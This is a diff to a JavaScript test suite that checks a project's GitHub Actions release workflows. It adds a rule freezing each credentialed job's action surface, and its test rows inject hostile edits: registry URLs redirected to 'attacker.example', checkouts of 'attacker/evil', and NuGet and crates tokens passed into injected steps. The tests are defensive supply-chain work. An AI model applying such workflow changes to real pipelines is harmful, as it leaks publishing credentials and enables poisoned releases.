@@ -21,10 +21,12 @@ import {
   publicGateFindings,
   readScriptOutputs,
   referenceFindings,
+  surfaceFindings,
   releaseGateFindings,
   verifyWorkflows,
 } from "./verify-workflows.mjs";
 import { lexStrict } from "./strict-shell.mjs";
+import { rowSnapshots } from "./row-snapshots.mjs";
 
 const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..", "..");
 const settings = JSON.parse(readFileSync(join(ROOT, SETTINGS), "utf8"));
@@ -42,6 +44,7 @@ const all = (w) =>
     ...publicGateFindings(w),
     ...releaseGateFindings(w),
     ...referenceFindings(w, SCRIPTS, settings),
+    ...surfaceFindings(w),
   ].map((f) => `${f.file}: ${f.job}: ${f.why}`);
 /** The findings `mutate` adds to the real tree, which itself has none. */
 function added(mutate) {
@@ -60,29 +63,10 @@ const append = (w, file, job, needle, line) => {
   s.run = `${s.run}\n${line}\n`;
 };
 
-/**
- * How many findings each refuses row adds to the real tree (round 7): a row
- * must fail on its own reason AND add exactly these, so a regression that
- * adds or drops a finding beside the pinned one is seen. Regenerate with
- * RECORD_ROW_COUNTS=<file> and review the diff.
- */
-const ROW_COUNTS = JSON.parse(
-  readFileSync(join(ROOT, "tools/repo-gates/fixtures/row-counts.json"), "utf8"),
-);
-const recorded = {};
-const seen = [];
-function expectCount(label, got) {
-  seen.push(label);
-  if (process.env.RECORD_ROW_COUNTS) {
-    recorded[label] = got.length;
-    return;
-  }
-  expect(got.length, `${label}:\n${got.join("\n")}`).toBe(ROW_COUNTS[label]);
-}
-afterAll(() => {
-  if (process.env.RECORD_ROW_COUNTS)
-    writeFileSync(process.env.RECORD_ROW_COUNTS, `${JSON.stringify(recorded, null, 2)}\n`);
-});
+/** Each refuses row's findings, snapshotted (row-snapshots.mjs). */
+const ROWS = rowSnapshots("row-findings.json");
+const expectCount = (label, got) => ROWS.check(label, got);
+afterAll(() => ROWS.finish());
 
 describe("the real release workflows", () => {
   it("have no finding", () => expect(all(BASE)).toEqual([]));
@@ -1190,11 +1174,250 @@ describe("each secret name reads its own secret (round 7)", () => {
   });
 });
 
-describe("the row counts", () => {
-  // Runs last (tests run in file order): every row was counted once, under a
-  // label of its own, and no recorded count is left over.
-  it.skipIf(Boolean(process.env.RECORD_ROW_COUNTS))("name every row once, and nothing else", () => {
-    expect(new Set(seen).size).toBe(seen.length);
-    expect(Object.keys(ROW_COUNTS).sort()).toEqual([...seen].sort());
+describe("17 every credentialed job's action surface is frozen (round 8)", () => {
+  const P_ = "sdk-publish.yml";
+  const j = (w, f, id) => w[f].jobs[id];
+  const S = (w, f, id, pred) => j(w, f, id).steps.find(pred);
+  const uses = (prefix) => (s) => String(s.uses).startsWith(prefix);
+  const SURFACE = /ACTION_SURFACE records/;
+  it.each([
+    [
+      "C1 pypi repository-url to an attacker",
+      (w) => {
+        S(w, P_, "publish-pypi", uses("pypa/")).with["repository-url"] =
+          "https://attacker.example/legacy/";
+      },
+      SURFACE,
+    ],
+    [
+      "C2 rubygems gem-server to an attacker",
+      (w) => {
+        const s = S(w, P_, "publish-rubygems", uses("rubygems/"));
+        s.with = { ...(s.with ?? {}), "gem-server": "https://attacker.example" };
+      },
+      SURFACE,
+    ],
+    [
+      "C2b rubygems audience override",
+      (w) => {
+        const s = S(w, P_, "publish-rubygems", uses("rubygems/"));
+        s.with = { ...(s.with ?? {}), audience: "attacker.example" };
+      },
+      SURFACE,
+    ],
+    [
+      "C3 maven checkout of another repository",
+      (w) => {
+        const s = S(w, P_, "publish-maven", uses("actions/checkout"));
+        s.with.repository = "attacker/evil";
+        s.with.ref = "main";
+      },
+      SURFACE,
+    ],
+    [
+      "C4 cli upload checkout of another repository",
+      (w) => {
+        S(w, C, "upload", uses("actions/checkout")).with.repository = "attacker/evil";
+      },
+      SURFACE,
+    ],
+    [
+      "C4b cli promote checkout of a pull request",
+      (w) => {
+        S(w, C, "promote", uses("actions/checkout")).with.ref = "refs/pull/1/head";
+      },
+      SURFACE,
+    ],
+    [
+      "C5 crates checkout of a pull request",
+      (w) => {
+        S(w, P_, "publish-crates", uses("actions/checkout")).with.ref = "refs/pull/1/head";
+      },
+      SURFACE,
+    ],
+    [
+      "C6 pypa inside the NuGet job, with its key",
+      (w) => {
+        const st = j(w, P_, "publish-nuget").steps;
+        st.splice(st.findIndex((s) => s.id === "login") + 1, 0, {
+          name: "inj",
+          uses: "pypa/gh-action-pypi-publish@dc37677b2e1c63e2034f94d8a5b11f265b73ba33",
+          with: {
+            "repository-url": "https://attacker.example/legacy/",
+            user: "x",
+            password: "${{ steps.login.outputs.NUGET_API_KEY }}",
+            "packages-dir": "release/",
+          },
+        });
+      },
+      SURFACE,
+    ],
+    [
+      "C6b a checkout with the crates token",
+      (w) => {
+        j(w, P_, "publish-crates").steps.push({
+          name: "inj",
+          uses: "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5",
+          with: {
+            "persist-credentials": false,
+            repository: "attacker/evil",
+            token: "${{ steps.auth.outputs.token }}",
+          },
+        });
+      },
+      /credential output of rust-lang\/crates-io-auth-action is read only in an env: value/,
+    ],
+    [
+      "C7 maven attestation subject forged",
+      (w) => {
+        S(w, P_, "publish-maven", uses("actions/attest")).with = {
+          "subject-name": "pkg:maven/io.confeature/sdk@9.9.9",
+          "subject-digest": `sha256:${"a".repeat(64)}`,
+        };
+      },
+      SURFACE,
+    ],
+    [
+      "C7b maven attestation pushed to a registry",
+      (w) => {
+        const s = S(w, P_, "publish-maven", uses("actions/attest"));
+        s.with = { ...s.with, "push-to-registry": true, "subject-name": "ghcr.io/attacker/x" };
+      },
+      SURFACE,
+    ],
+    [
+      "C11 setup-node's registry-url to an attacker",
+      (w) => {
+        S(w, P_, "publish-npm", uses("actions/setup-node")).with["registry-url"] =
+          "https://attacker.example/";
+      },
+      SURFACE,
+    ],
+    [
+      "C12 download-artifact of every artifact of the run",
+      (w) => {
+        S(w, P_, "publish-maven", uses("actions/download-artifact")).with = {
+          pattern: "*",
+          "merge-multiple": true,
+          path: "release",
+        };
+      },
+      SURFACE,
+    ],
+    [
+      "C13 pypi packages-dir /",
+      (w) => {
+        S(w, P_, "publish-pypi", uses("pypa/")).with["packages-dir"] = "/";
+      },
+      SURFACE,
+    ],
+    [
+      "C14 NuGet login user from the event",
+      (w) => {
+        S(w, P_, "publish-nuget", (s) => s.id === "login").with.user =
+          "${{ github.event.head_commit.author.name }}";
+      },
+      SURFACE,
+    ],
+    [
+      "C17 a credentialed job's continue-on-error: true",
+      (w) => {
+        j(w, P_, "publish-go")["continue-on-error"] = true;
+      },
+      /continue-on-error/,
+    ],
+    [
+      "C18 crates-io-auth-action url to an attacker",
+      (w) => {
+        S(w, P_, "publish-crates", (s) => s.id === "auth").with = {
+          url: "https://attacker.example",
+        };
+      },
+      SURFACE,
+    ],
+    [
+      "C19 NuGet/login token-service-url to an attacker",
+      (w) => {
+        const s = S(w, P_, "publish-nuget", (s) => s.id === "login");
+        s.with = { ...s.with, "token-service-url": "https://attacker.example/token" };
+      },
+      SURFACE,
+    ],
+    [
+      "D4 the NuGet key as a download-artifact name",
+      (w) => {
+        j(w, P_, "publish-nuget").steps.push({
+          name: "inj",
+          uses: "actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093",
+          with: { name: "${{ steps.login.outputs.NUGET_API_KEY }}", path: "release" },
+        });
+      },
+      /credential output of NuGet\/login is read only in an env: value/,
+    ],
+    [
+      "an action step removed",
+      (w) => {
+        const st = j(w, P_, "publish-pypi").steps;
+        st.splice(st.findIndex(uses("pypa/")), 1);
+      },
+      SURFACE,
+    ],
+    [
+      "an id changed",
+      (w) => {
+        S(w, P_, "publish-nuget", (s) => s.id === "login").id = "other";
+      },
+      SURFACE,
+    ],
+    [
+      "D2 a credential on a step that reads it only in a comment",
+      (w) => {
+        const s = j(w, P_, "publish-go").steps.find(
+          (x) => x.name === "Ask the Go proxy for the release",
+        );
+        s.env = { ...(s.env ?? {}), DEPLOY_KEY: "${{ secrets.GO_TAG_DEPLOY_KEY }}" };
+        s.run = `# \${DEPLOY_KEY}\n${s.run}`;
+      },
+      /sets the credential DEPLOY_KEY but its run: does not read it/,
+    ],
+  ])("refuses %s", (label, mutate, why) => {
+    const got = added(mutate);
+    expectCount(label, got);
+    expect(
+      got.some((g) => why.test(g)),
+      got.join("\n") || "no finding",
+    ).toBe(true);
   });
+  it("C15 (control): a job name reading a setup output is accepted", () =>
+    expect(
+      added((w) => {
+        j(w, P_, "publish-go").name = "x ${{ needs.setup.outputs.name }}";
+      }),
+    ).toEqual([]));
+  it("verifyWorkflows runs rule 17 on a copy of the repository", () => {
+    const dir = mkdtempSync(join(tmpdir(), "release-workflows-"));
+    try {
+      for (const rel of [SETTINGS, MANIFEST, WORKFLOWS])
+        cpSync(join(ROOT, rel), join(dir, rel), { recursive: true });
+      const f = join(dir, WORKFLOWS, P_);
+      writeFileSync(
+        f,
+        readFileSync(f, "utf8").replace(
+          "packages-dir: release/",
+          "packages-dir: release/\n          repository-url: https://attacker.example/legacy/",
+        ),
+      );
+      expect(verifyWorkflows(dir).map((x) => x.why)).toContainEqual(
+        expect.stringMatching(/ACTION_SURFACE records/),
+      );
+    } finally {
+      rmSync(dir, { recursive: true, force: true });
+    }
+  });
+  it("refuses a recorded job the workflow no longer has", () =>
+    expect(
+      surfaceFindings({ "sdk-publish.yml": { jobs: {} }, "cli-release.yml": { jobs: {} } }).map(
+        (f) => f.why,
+      ),
+    ).toContainEqual("ACTION_SURFACE records a credentialed job the workflow does not have"));
 });
